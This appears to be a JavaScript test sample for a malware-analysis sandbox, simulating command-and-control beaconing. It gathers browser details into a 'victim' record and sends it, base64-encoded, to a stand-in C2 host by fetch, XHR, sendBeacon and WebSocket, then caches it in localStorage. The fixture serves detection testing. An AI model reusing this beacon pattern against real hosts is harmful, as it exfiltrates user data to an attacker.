// Network C2 simulation: fetch POST, XHR beacon, sendBeacon and WebSocket in one
// sample. The sandbox never performs real I/O: every request becomes a `net`
// trace event and an IOC; the default policy answers with a realistic DNS error.
(function () {
  var victim = {
    id: 'victim-7f3a',
    platform: navigator.platform,
    language: navigator.language,
    stage: 1
  };
  var body = btoa(JSON.stringify(victim));
  try {
    fetch('https://c2.example.test/beacon', {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: body
    }).then(function (response) {
      return response.text();
    }).then(function (text) {
      console.log('fetch response', text.length);
    }).catch(function (error) {
      console.log('fetch blocked', error.name);
    });
  } catch (error) {
    console.log('fetch threw', error.message);
  }
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://c2.example.test/gate.php');
    xhr.setRequestHeader('x-id', victim.id);
    xhr.onerror = function () { console.log('xhr error', xhr.status); };
    xhr.onload = function () { console.log('xhr load', xhr.status); };
    xhr.send(body);
  } catch (error) {
    console.log('xhr threw', error.message);
  }
  try {
    if (navigator.sendBeacon) navigator.sendBeacon('https://c2.example.test/hit', body);
  } catch (error) {
    console.log('beacon threw', error.message);
  }
  try {
    var socket = new WebSocket('wss://c2.example.test/ws');
    socket.onopen = function () { socket.send('hello'); };
    socket.onerror = function () { console.log('websocket blocked'); };
  } catch (error) {
    console.log('websocket threw', error.message);
  }
  try {
    localStorage.setItem('cfg', body);
    console.log('stored config', localStorage.getItem('cfg').length);
  } catch (error) {
    console.log('storage threw', error.message);
  }
  setTimeout(function () { console.log('beacon retry'); }, 500);
})();
